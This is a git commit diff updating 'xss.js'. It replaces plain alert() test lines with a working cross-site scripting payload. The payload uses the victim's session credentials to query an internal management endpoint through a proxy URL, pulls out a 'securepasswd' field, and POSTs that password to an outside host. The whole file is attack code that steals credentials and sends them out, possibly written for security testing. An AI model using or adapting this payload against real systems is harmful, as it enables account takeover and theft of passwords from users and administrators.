2be923d96ec2c8d5e78eac42c1f09752e911406a
musana <musana@users.noreply.github.com>
2025-06-26 17:25:21 +0300

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,4 +1,24 @@
-alert(document.domain);
-alert(document.cookie);
-alert("XSS")
+(async () => {
+  try {
+    const response = await fetch("https://10.210.34.88/go/http://127.0.0.1:12345/management/users/1", {
+      credentials: "include" 
+    });
 
+    const json = await response.json();
+    const passwdValue = json.securepasswd;
+    
+    await fetch("https://sonicwall.com/log", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        data: passwdValue,
+        timestamp: Date.now()
+      })
+    });
+
+  } catch (err) {
+    console.error("Hata:", err);
+  }
+})();
